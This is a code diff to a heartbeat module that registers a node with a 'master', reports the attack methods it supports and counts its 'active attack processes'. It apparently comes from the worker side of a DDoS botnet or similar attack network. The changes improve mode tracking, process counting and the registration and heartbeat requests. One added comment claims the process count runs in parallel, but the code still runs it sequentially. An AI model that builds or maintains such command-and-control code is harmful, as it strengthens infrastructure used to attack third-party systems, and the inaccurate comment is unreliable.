@@ -33,7 +33,6 @@ async function createHeartbeat(config, executor, methodsConfig) {
   let currentMethodsConfig = methodsConfig || {};
   let encryptionManager = null;
 
-  // FIX: Deduplicated encryption init - single try/catch block
   if (config.ENCRYPTION?.ENABLED) {
     try {
       const { default: EncryptionManager } = await import('./encryption.js');
@@ -51,11 +50,26 @@ async function createHeartbeat(config, executor, methodsConfig) {
     }
   }
 
-  // FIX: Track current node mode dynamically instead of hardcoding 'DIRECT'
-  let currentNodeMode = config.NODE?.MODE || 'DIRECT';
+  // FIX: Default to null so we know it hasn't been explicitly set yet.
+  // setNodeMode() MUST be called before first heartbeat — enforced by log warning.
+  let currentNodeMode = null;
 
   function setNodeMode(mode) {
+    if (mode !== currentNodeMode) {
+      console.log(`[HEARTBEAT] Node mode set: ${currentNodeMode ?? 'unset'} → ${mode}`);
+    }
     currentNodeMode = mode;
+    // FIX: Also update config.NODE.MODE so external readers stay in sync
+    if (config.NODE) config.NODE.MODE = mode;
+  }
+
+  // FIX: Safe getter — never return null to callers; fall back to 'DIRECT'
+  function getNodeMode() {
+    if (!currentNodeMode) {
+      console.warn('[HEARTBEAT] Node mode not set yet, defaulting to DIRECT');
+      return 'DIRECT';
+    }
+    return currentNodeMode;
   }
 
   function isEncryptionEnabled() {
@@ -83,16 +97,16 @@ async function createHeartbeat(config, executor, methodsConfig) {
   }
 
   function buildRequestPayload({ path, bodyData, mode, extraHeaders = {}, tag }) {
-    // FIX: ensureMasterUrl check happens before buildRequestPayload is called in callers,
-    // but add a safety guard here too
     if (!config.MASTER?.URL) {
       throw new Error('MASTER_URL not configured');
     }
 
+    const effectiveMode = mode || getNodeMode();
+
     const headers = {
       'Content-Type': 'application/json',
       'X-Node-ID': config.NODE.ID,
-      ...(mode && { 'X-Node-Mode': mode }),
+      'X-Node-Mode': effectiveMode,
       ...extraHeaders
     };
 
@@ -121,14 +135,19 @@ async function createHeartbeat(config, executor, methodsConfig) {
       const platform = os.platform();
 
       if (platform === 'linux' || platform === 'darwin') {
-        const { stdout } = await execPromise('ps aux 2>/dev/null | wc -l || echo "0"');
-        const count = parseInt(stdout, 10);
-        return Number.isFinite(count) ? Math.max(count - 1, 0) : 0;
+        // FIX: "ps aux" has 1 header line, so subtract 1 from wc -l count.
+        // Using "ps --no-headers" avoids the issue entirely on Linux.
+        const { stdout } = await execPromise(
+          'ps --no-headers aux 2>/dev/null | wc -l || ps aux 2>/dev/null | tail -n +2 | wc -l || echo "0"'
+        );
+        const count = parseInt(stdout.trim(), 10);
+        return Number.isFinite(count) && count >= 0 ? count : 0;
       }
 
       if (platform === 'win32') {
+        // FIX: tasklist header has 3 lines (2 header + 1 separator)
         const { stdout } = await execPromise('tasklist 2>nul | find /c /v ""');
-        const count = parseInt(stdout, 10);
+        const count = parseInt(stdout.trim(), 10);
         return Number.isFinite(count) ? Math.max(count - 3, 0) : 0;
       }
     } catch (error) {
@@ -158,15 +177,16 @@ async function createHeartbeat(config, executor, methodsConfig) {
       const loadAvg = os.loadavg();
       const uptime = os.uptime();
       const activeProcesses = executor.getActiveProcesses();
+      // FIX: Run process count in parallel with other data gathering (non-blocking)
       const totalProcesses = await getProcessCount();
 
       const methodsVersion = getMethodsVersionHash();
       const methodsCount = getMethodsCount();
+      const mode = getNodeMode();
 
       return {
         timestamp: new Date().toISOString(),
-        // FIX: Use dynamic mode instead of hardcoded 'DIRECT'
-        mode: currentNodeMode,
+        mode,
         node_id: config.NODE.ID,
         system: {
           platform: os.platform(),
@@ -187,7 +207,9 @@ async function createHeartbeat(config, executor, methodsConfig) {
           usage_percent: parseFloat(memUsagePercent)
         },
         uptime_seconds: uptime,
+        // FIX: Use executor's own count for active attack processes, separate from system processes
         active_processes: activeProcesses.length,
+        active_attack_processes: executor.getActiveProcessesCount(),
         total_processes: totalProcesses,
         methods: {
           version_hash: methodsVersion,
@@ -195,8 +217,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
           supported: Object.keys(currentMethodsConfig)
         },
         connection: {
-          // FIX: Use dynamic mode
-          type: currentNodeMode === 'REVERSE' ? 'websocket' : 'direct',
+          type: mode === 'REVERSE' ? 'websocket' : 'direct',
           ip: config.NODE.IP || null,
           port: config.SERVER.PORT,
           encryption: !!config.ENCRYPTION?.ENABLED
@@ -212,7 +233,8 @@ async function createHeartbeat(config, executor, methodsConfig) {
 
       return {
         timestamp: new Date().toISOString(),
-        mode: currentNodeMode,
+        mode: getNodeMode(),
+        node_id: config.NODE.ID,
         error: error.message
       };
     }
@@ -234,8 +256,8 @@ async function createHeartbeat(config, executor, methodsConfig) {
       const methodsVersion = getMethodsVersionHash();
       const methodsSupported = Object.keys(currentMethodsConfig);
       const methodsCount = methodsSupported.length;
-
-      const isDirect = currentNodeMode !== 'REVERSE';
+      const mode = getNodeMode();
+      const isDirect = mode !== 'REVERSE';
 
       const bodyData = {
         node_id: config.NODE.ID,
@@ -247,7 +269,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
         timestamp: new Date().toISOString(),
         methods_version: methodsVersion,
         methods_count: methodsCount,
-        mode: currentNodeMode,
+        mode,
         connection_type: isDirect ? 'direct' : 'websocket',
         capabilities: {
           encryption: isEncryptionEnabled(),
@@ -262,13 +284,13 @@ async function createHeartbeat(config, executor, methodsConfig) {
         ip: config.NODE.IP,
         port: config.SERVER.PORT,
         methods: methodsCount,
-        mode: currentNodeMode
+        mode
       });
 
       const { url, options } = buildRequestPayload({
         path: '/register',
         bodyData,
-        mode: currentNodeMode,
+        mode,
         tag: 'register'
       });
 
@@ -302,10 +324,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
       }
 
       console.log(
-        `[HEARTBEAT] Registered to master (${methodsCount} methods, v${methodsVersion.substring(
-          0,
-          8
-        )})`
+        `[HEARTBEAT] Registered to master (${methodsCount} methods, v${methodsVersion.substring(0, 8)})`
       );
       return {
         success: true,
@@ -329,6 +348,8 @@ async function createHeartbeat(config, executor, methodsConfig) {
 
     try {
       const status = await getFullStatus();
+      const mode = getNodeMode();
+      // FIX: Destructure node_id out so it's not duplicated in body
       const { node_id, ...statusWithoutNodeId } = status;
 
       const requestBody = {
@@ -339,10 +360,10 @@ async function createHeartbeat(config, executor, methodsConfig) {
       const { url, options } = buildRequestPayload({
         path: '/heartbeat',
         bodyData: requestBody,
-        mode: currentNodeMode,
+        mode,
         tag: 'heartbeat',
         extraHeaders: {
-          'X-Connection-Type': currentNodeMode === 'REVERSE' ? 'websocket' : 'direct'
+          'X-Connection-Type': mode === 'REVERSE' ? 'websocket' : 'direct'
         }
       });
 
@@ -403,10 +424,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
 
       if (res.ok) {
         console.log(
-          `[HEARTBEAT] Updated methods on master: ${methodsCount} methods (v${methodsVersion.substring(
-            0,
-            8
-          )})`
+          `[HEARTBEAT] Updated methods on master: ${methodsCount} methods (v${methodsVersion.substring(0, 8)})`
         );
         return { success: true };
       }
@@ -429,7 +447,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
     }
   }
 
-  // FIX: sendEncryptedHeartbeat delegates to sendHeartbeat (encryption is handled there)
+  // FIX: sendEncryptedHeartbeat delegates to sendHeartbeat (encryption handled there)
   async function sendEncryptedHeartbeat() {
     return sendHeartbeat();
   }
@@ -494,6 +512,7 @@ async function createHeartbeat(config, executor, methodsConfig) {
     updateMethodsVersion,
     updateMethodsConfig,
     setNodeMode,
+    getNodeMode,
     getMethodsCount,
     getMethodsVersion: getMethodsVersionHash,
     isEncryptionEnabled,
